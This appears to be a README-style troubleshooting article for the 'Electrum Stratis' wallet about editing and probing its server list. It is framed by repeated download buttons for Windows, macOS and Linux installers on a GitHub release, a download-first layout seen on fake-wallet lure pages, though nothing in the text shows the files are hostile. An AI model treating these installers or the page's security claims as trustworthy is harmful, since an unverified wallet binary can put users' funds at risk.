![Electrum-Stratis](assets/banner-article.png)

# The server list and the cloud node: choosing a peer that works

<p align="center">Probe, reorder, keep what answers</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

Electrum Stratis ships with a server list and lets you edit it in the app, so a failing peer is a switch rather than an outage. The list is a starting point, not a fixed set: servers can be added, removed, reordered and probed without touching a configuration file. A server that answers a probe is a candidate; one that fails will never serve the wallet. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| Symptom | Meaning | Where to go |
|---|---|---|
| "Not Connected" with the default list | Every bundled entry failed for your network | Add a server that probes green |
| Connected, but the height lags | The peer is reachable and behind | Move it below a current one |
| One server works and another never does | Normal; peers differ in uptime and policy | Pin the one that works |
| A server you added disappears after an update | The list is per wallet file, and updates can reset it | Re-add and keep a note |

</div>

The health panel is the instrument here: it names the server, its latency, the height and the age of the last block, which is enough to tell a dead peer from a slow one.

## Why it happens

A light wallet trusts a server for its view of the chain. Any server can be slow, rate-limited, unreachable from a given network, or simply behind. Because the wallet cannot audit every server continuously, it retries across the list and reports what it finds. That design is why the connection is fixable by the user rather than by a support ticket.

The "cloud node" question is the same question in different words: people ask whether they must run a node in the cloud to connect. No - the wallet needs one reachable server, not a machine you operate. Running your own is a legitimate choice for privacy, and it is not a requirement for using the wallet.

The node editor is not an add-on: it is part of the build, which is actively maintained and available from the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), and it opens from the same window as the server list.

## Fix

1. **Open the server list and probe the entries.** A probe returns quickly; a server that fails twice is not worth keeping above one that answers.
2. **Reorder so the working server is first.** Automatic selection walks the list, and ordering decides what it tries first.
3. **Add a server when the list is exhausted.** Paste a host and port, probe it, then save. Keep the SSL setting as configured unless the server documents otherwise.
4. **Watch the height after switching.** A server that answers but sits thousands of blocks back will connect and still show stale data, which looks like a wallet problem and is not.
5. **Record the servers that work.** A short note saves the same search next time a default entry goes quiet.

If you run your own node, point the wallet at it and treat it as the only entry, so the wallet fails loudly when the node is down instead of silently switching to a peer you did not choose.

## If that did not work

If no server answers on any network, the problem is not the list. A firewall, a VPN, a proxy or a TLS-inspecting antivirus will block every peer identically, and the diagnostics export will show the handshake failing the same way each time.

If servers answer and the wallet still shows nothing, the wallet is connected to a peer that is behind, or it is looking at a different wallet file. Check the height first, then the addresses.

If a server works today and fails tomorrow, that is normal churn rather than a fault in the wallet; keep two or three known-good entries so a single disappearance is not an outage. If nothing connects on any network with any build, compare what you are running with [where to get Electrum Stratis](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/where-to-get-the-current-build.md) before assuming a network fault.

## Prevention

- Keep two or three servers you have probed and know respond.
- Prefer a server with a recent last block over one with low latency and a stale height.
- Keep automatic selection on unless you have a reason to pin a peer.
- After any network change, open the health panel once.
- Note which server you use, so a later failure is a comparison rather than a guess.
- Keep two servers you have probed successfully, so one failure is not an outage.

## FAQ

### Why is the default server that comes with it wrong?

It is not wrong so much as temporary: a bundled host can go offline, move, or stop serving a given network. The list exists to be edited, and the correct first response to a dead default is to probe the others and add one that answers.

### If I get zero connections, should I add nodes to a config file?

No file editing is needed. The wallet has an in-app node list: add the host and port there, probe it, and put it first. Editing a configuration file by hand is the older habit and the more error-prone one.

### Do I need to run my own node?

No. The wallet needs one reachable server, whoever operates it. Running your own improves privacy and removes reliance on a third party, at the cost of maintaining a synced node.

### Can a server steal my coins?

No. The server never sees your keys and cannot sign anything; it supplies chain data. A malicious server could mislead you about a balance or withhold a transaction, which is why the wallet cross-checks its total against an independent source.

<!-- DOWNLOAD-BLOCK -->

The list is a convenience, not an authority. Each entry is a host that may be fast, slow, honest or gone, and the wallet picks one without knowing which. That is why the useful skill is not finding the best server but recognising a bad one quickly: no response, an old height, or a certificate error are all reasons to move on rather than to troubleshoot the wallet.

## Related articles

- [Why "Not Connected" happens](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/wallet-says-not-connected.md)
- [The Use SSL toggle](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/the-use-ssl-toggle.md)
- [Why is my balance missing? Three causes](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md)
- [Is Electrum Stratis safe to use?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)
